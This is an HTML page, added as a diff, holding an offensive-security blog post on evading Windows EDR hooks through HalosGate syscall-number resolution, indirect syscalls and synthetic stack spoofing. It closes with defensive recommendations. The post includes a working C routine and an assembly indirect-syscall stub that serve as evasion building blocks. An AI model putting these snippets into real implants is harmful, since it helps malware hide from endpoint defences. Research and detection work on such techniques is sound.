@@ -1,0 +1,172 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#090909">
+<title>Bypassing Modern EDR Hooks via Direct Syscalls & Synthetic Stack Frames — OSEC Blog</title>
+<meta name="description" content="Analyzing user-mode API unhooking, dynamic SSN resolution via HalosGate, and synthetic stack spoofing to defeat call-stack telemetry in modern Windows endpoints.">
+<meta name="author" content="OSEC RESEARCH TEAM">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<link rel="canonical" href="https://osec.uz/blog/bypassing-edr-syscalls.html">
+
+<!-- Open Graph / Facebook -->
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://osec.uz/blog/bypassing-edr-syscalls.html">
+<meta property="og:title" content="Bypassing Modern EDR Hooks via Direct Syscalls & Synthetic Stack Frames — OSEC Blog">
+<meta property="og:description" content="Analyzing user-mode API unhooking, dynamic SSN resolution via HalosGate, and synthetic stack spoofing to defeat call-stack telemetry in modern Windows endpoints.">
+<meta property="og:site_name" content="OSEC.uz">
+<meta property="article:published_time" content="2026-08-20">
+<meta property="article:author" content="OSEC RESEARCH TEAM">
+
+<!-- Twitter -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:url" content="https://osec.uz/blog/bypassing-edr-syscalls.html">
+<meta name="twitter:title" content="Bypassing Modern EDR Hooks via Direct Syscalls & Synthetic Stack Frames — OSEC Blog">
+<meta name="twitter:description" content="Analyzing user-mode API unhooking, dynamic SSN resolution via HalosGate, and synthetic stack spoofing to defeat call-stack telemetry in modern Windows endpoints.">
+<meta name="twitter:creator" content="@hidoyatiyy">
+
+<!-- Structured Data (JSON-LD) -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Bypassing Modern EDR Hooks via Direct Syscalls & Synthetic Stack Frames",
+  "description": "Analyzing user-mode API unhooking, dynamic SSN resolution via HalosGate, and synthetic stack spoofing to defeat call-stack telemetry in modern Windows endpoints.",
+  "datePublished": "2026-08-20",
+  "mainEntityOfPage": "https://osec.uz/blog/bypassing-edr-syscalls.html",
+  "author": {
+    "@type": "Person",
+    "name": "OSEC RESEARCH TEAM"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "OSEC.uz",
+    "url": "https://osec.uz/"
+  }
+}
+</script>
+
+<link rel="stylesheet" href="../style.css">
+</head>
+
+<body>
+<header>
+<div class="wrap nav">
+  <a href="../index.html" class="logo">OSEC<span>.uz</span></a>
+  <div class="nav-center">OSEC BLOG / EXPLOIT DEV</div>
+  <div class="nav-right">
+    <a href="../index.html#surface">Explore</a>
+    <a href="index.html" class="active nav-accent">Blog</a>
+    <a href="../index.html#contact">Engage →</a>
+  </div>
+</div>
+</header>
+
+<main>
+<article>
+<div class="article-header">
+  <div class="wrap">
+    <a href="index.html" class="back-link">← Back to Blog Archive</a>
+    <div class="label"><span class="red">BLOG</span> / EXPLOIT DEV</div>
+    <h1 style="margin-top:20px">Bypassing Modern EDR Hooks via Direct Syscalls & Synthetic Stack Frames</h1>
+    <div class="article-meta-bar">
+      <span>DATE: <strong>2026.08.20</strong></span>
+      <span class="dot">/</span>
+      <span>CATEGORY: <strong class="red">EXPLOIT DEV</strong></span>
+      <span class="dot">/</span>
+      <span>READ TIME: <strong>7 MIN READ</strong></span>
+      <span class="dot">/</span>
+      <span>AUTHOR: <strong>OSEC RESEARCH TEAM</strong></span>
+    </div>
+  </div>
+</div>
+
+<div class="wrap article-layout">
+  <div class="article-body">
+    <p>Endpoint Detection and Response (EDR) agents predominantly rely on injecting a user-mode dynamic-link library (DLL) into newly spawned processes. This injected library patches sensitive Native API functions inside <code>ntdll.dll</code> (such as <code>NtAllocateVirtualMemory</code>, <code>NtProtectVirtualMemory</code>, and <code>NtCreateThreadEx</code>) with unconditional jumps (<code>jmp</code>) pointing into the EDR&#39;s inspection engine.</p>
+<div class="advisory-box">**Offensive Principle**
+When userland hooks are bypassed via raw direct syscalls alone, modern EDRs with kernel-mode telemetry (ETW-Ti) inspect the Call Stack. An unbacked thread executing a syscall outside of `ntdll.dll` boundaries is immediately flagged as anomalous.</div>
+<h2>1. The Evolution of Syscall Resolution</h2>
+<p>Traditional direct syscall techniques hardcoded System Service Numbers (SSNs). Because SSNs fluctuate across Windows kernel builds and service packs, modern offensive tooling dynamically calculates SSNs by parsing the Export Address Table (EAT) of <code>ntdll.dll</code>.</p>
+<p>Using the <strong>HalosGate</strong> algorithm, an operator can locate the syscall stub even when neighboring functions are hooked by reading adjacent function opcodes up and down memory boundaries:</p>
+<div class="code-block"><div class="code-header"><span>C</span><span>COMMAND / CODE</span></div><pre><code>// Dynamic SSN extraction with hook tolerance
+DWORD GetSyscallNumber(PVOID pFunctionAddress) {
+    BYTE *pOpcode = (BYTE*)pFunctionAddress;
+    
+    // Check if clean stub: mov r10, rcx; mov eax, SSN
+    if (pOpcode[0] == 0x4C && pOpcode[1] == 0x8B && pOpcode[2] == 0xD1 && pOpcode[3] == 0xB8) {
+        return *(DWORD*)(pOpcode + 4);
+    }
+    
+    // If hooked (jmp / 0xE9), inspect adjacent stubs
+    for (WORD idx = 1; idx < 32; idx++) {
+        BYTE *down = pOpcode + (idx * 0x20);
+        if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
+            return *(DWORD*)(down + 4) - idx;
+        }
+    }
+    return 0;
+}</code></pre></div>
+<h2>2. Indirect Syscalls: Preserving the Return Pointer</h2>
+<p>Rather than executing the <code>syscall</code> instruction within private heap or image allocations, <strong>indirect syscalls</strong> jump directly to a legitimate <code>syscall; ret</code> gadget already resident inside <code>ntdll.dll</code>. This ensures that the kernel return address points into trusted Microsoft module memory space.</p>
+<div class="code-block"><div class="code-header"><span>ASM</span><span>COMMAND / CODE</span></div><pre><code>.code
+IndirectSyscall PROC
+    mov r10, rcx                ; Preserve 1st arg into r10
+    mov eax, [rsp + 28h]        ; Load dynamically resolved SSN
+    mov r11, [rsp + 30h]        ; Address of 'syscall; ret' inside ntdll.dll
+    jmp r11                     ; Jump into legitimate ntdll gadget
+IndirectSyscall ENDP
+END</code></pre></div>
+<h2>3. Synthetic Stack Spoofing</h2>
+<p>Even with indirect syscalls, static stack walk inspection (via ETW-Ti or asynchronous APC sampling) will reveal abnormal stack frame ancestry. By utilizing synthetic stack spoofing (desynchronizing the physical register stack pointer <code>RSP</code> from the unwind metadata registered in <code>RUNTIME_FUNCTION</code>), we can forge arbitrary stack frames such as:</p>
+<ul>
+<li><code>ntdll.dll!NtAllocateVirtualMemory + 0x14</code></li>
+<li><code>KERNELBASE.dll!VirtualAllocEx + 0x42</code></li>
+<li><code>explorer.exe!ThreadStart + 0x110</code></li>
+</ul>
+<h2>4. Defensive Recommendations</h2>
+<p>To detect and mitigate advanced syscall bypasses, defensive teams must not rely solely on userland hooks:</p>
+<ul>
+<li><strong>Enable ETW-Ti (Threat Intelligence):</strong> Subscribe to kernel-level <code>KERNEL_THREATINT_KEYWORD_INLINE_SYSCALL</code> telemetry.</li>
+<li><strong>Implement Kernel-mode Call Stack Telemetry:</strong> Verify that unwind chains match continuous valid thread execution contexts.</li>
+<li><strong>Arbitrary Code Guard (ACG):</strong> Enforce W^X protections to prevent the allocation and execution of dynamically unbacked memory pages.</li>
+</ul>
+
+  </div>
+
+  <aside class="sidebar-sticky">
+    <div class="side-panel">
+      <h4>METADATA & ATT&CK</h4>
+      <ul>
+        <li><strong>TACTIC:</strong> <span>Defense Evasion</span></li>
+        <li><strong>TECHNIQUE:</strong> <span>T1055, T1106</span></li>
+        <li><strong>SEVERITY:</strong> <span class="red">CRITICAL</span></li>
+        <li><strong>STATUS:</strong> <span>Verified & Reproducible</span></li>
+      </ul>
+    </div>
+
+    <div class="side-panel">
+      <h4>TECHNICAL SCOPE</h4>
+      <p style="font-size:0.75rem; color:#888; line-height:1.6">
+        Analyzing user-mode API unhooking, dynamic SSN resolution via HalosGate, and synthetic stack spoofing to defeat call-stack telemetry in modern Windows endpoints.
+      </p>
+    </div>
+  </aside>
+</div>
+</article>
+</main>
+
+<footer>
+<div class="wrap footer">
+  <div>© 2026 OSEC.uz · Offensive security & security validation</div>
+  <div class="footer-links">
+    <a href="index.html">Blog</a>
+    <a href="../index.html">Home</a>
+    <a href="../admin/index.html" class="mono" style="opacity:0.6">[Admin]</a>
+    <a href="mailto:offseckh@icloud.com">Secure mail</a>
+  </div>
+</div>
+</footer>
+</body>
+</html>
